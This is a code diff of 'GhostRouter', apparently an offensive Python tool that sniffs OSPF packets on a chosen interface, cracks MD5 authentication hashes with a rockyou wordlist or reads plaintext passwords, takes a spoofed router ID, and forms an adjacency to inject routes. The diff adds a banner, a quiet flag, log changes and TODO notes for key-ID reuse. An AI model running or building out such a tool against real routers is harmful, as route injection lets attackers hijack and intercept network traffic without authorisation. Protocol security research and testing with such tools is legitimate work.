@@ -12,9 +12,30 @@ from helper.helper import (
         LOG, hash_password,
         )
 
+# TODO: ADD LOGIC TO MAP CRACKED PASSWORD TO KEY ID
+# ADD A ROTATING KEY LIST IN OSPF
+# SCRIPT SHOULD CHECK FILELIST FOR MATCHING KEY ID AND USE IT FIRST
+# THEN RUN CRACKER ON IT ONLY IF KEY ID DOES NOT EXISTS OR STORED PASSWORD IS WRONG
 
 # FALLBACK if dict param not specified - easy to modify
 ROCKYOU = "/usr/share/wordlists/rockyou.txt"
+
+def banner() -> None:
+    """Display Green ANSI Color Code Banner"""
+    COLOR = "\033[32m"
+    RESET = "\033[0m"
+
+    BANNER = r"""
+   ________               __  ____              __           
+  / ____/ /_  ____  _____/ /_/ __ \____  __  __/ /____  _____
+ / / __/ __ \/ __ \/ ___/ __/ /_/ / __ \/ / / / __/ _ \/ ___/
+/ /_/ / / / / /_/ (__  ) /_/ _, _/ /_/ / /_/ / /_/  __/ /    
+\____/_/ /_/\____/____/\__/_/ |_|\____/\__,_/\__/\___/_/     
+                                                                     
+                        GhostRouter
+                OSPF Adjacency & Route Injection
+    """
+    print(f"{COLOR}{BANNER}{RESET}")
 
 def crack_password(pkt: Any, filename: str) -> str | None:
     """
@@ -67,7 +88,7 @@ def crack_password(pkt: Any, filename: str) -> str | None:
 
                 if generated_hash.hex() == extracted_hash:
                     # Match
-                    LOG.critical("[!] Found Password: %s", pw)
+                    LOG.critical(f"[!] Cracked Password: \033[1m{pw}\033[0m [!]")
                     return pw 
         # Password Cracking Failed
         LOG.fatal("[!] Failed to crack password. Hash: %s", extracted_hash.hex())
@@ -81,12 +102,18 @@ def crack_password(pkt: Any, filename: str) -> str | None:
         LOG.error(f"[!] crack_password - Unknown error: {e}")
 
 def main() -> None:
+    """Main Logic"""
     parser = argparse.ArgumentParser()
     parser.add_argument("int", help="Network Interface Card to bind to (e.g. eth0)")
     parser.add_argument("router_id", help="Logical OSPF Router ID to assume (e.g. 10.10.10.10)")
-    parser.add_argument("--dict", default=ROCKYOU, help="Path to dictionary file for MD5 hash cracking")
+    parser.add_argument("-d", "--dict", default=ROCKYOU, help="Path to dictionary file for MD5 hash cracking")
+    parser.add_argument("-q", "--quiet", action="store_true", help="Do not print banner")
 
     args = parser.parse_args()
+
+    if not getattr(args, "quiet", False):
+        banner()
+
     LOG.info("[*] Initializing OSPF Injector...")
     
     # Dynamically Retrieve OSPF fields
@@ -148,10 +175,6 @@ def main() -> None:
             else:
                 extract_details["auth_seq"] = (getattr(ospf_packets, "seq", 0) + 1) & 0xFFFFFFFF
 
-
-        # NOTE: CURRENTLY CRACKS PASSWORD FIRST BEFORE COMMENCING OSPF ADJACENCY
-        # DECIDE IF WE WANT TO USE THREADS TO RUN CRACKER IN THE BACKGROUND ASYNCRHONOUSLY
-        # WILL REQUIRE CRACKIGN FUNCTION TO BE MOVED INTO OSPFSESSION AS WE CANNOT INITIALIZE OSPF SESSION THEN CRACK PASSWORD
         # Impt: Extract password/authdata and perform hash cracking first
         if extract_details["authtype"] == OSPFAuthType.PLAINTEXT:
             # Extract plaintext pw directly
@@ -159,8 +182,6 @@ def main() -> None:
             LOG.info(f"[*] Plaintext Password: {extract_details["password"]}")
         elif extract_details["authtype"] == OSPFAuthType.CRYPTO:
             extract_details["password"] = crack_password(pkt, args.dict)
-
-        # self.config.plaintext_pw = self.crack_password(ospf, self.dictpath)
 
         if not extract_details.get("password"):
             exit(1)
@@ -204,8 +225,7 @@ def main() -> None:
         session.run()
     except KeyboardInterrupt:
         session.running = False
-        LOG.info("SPOOFER STOPPED")
-
+        LOG.error("PROGRAM STOPPED")
 
 if __name__ == "__main__":
     main()
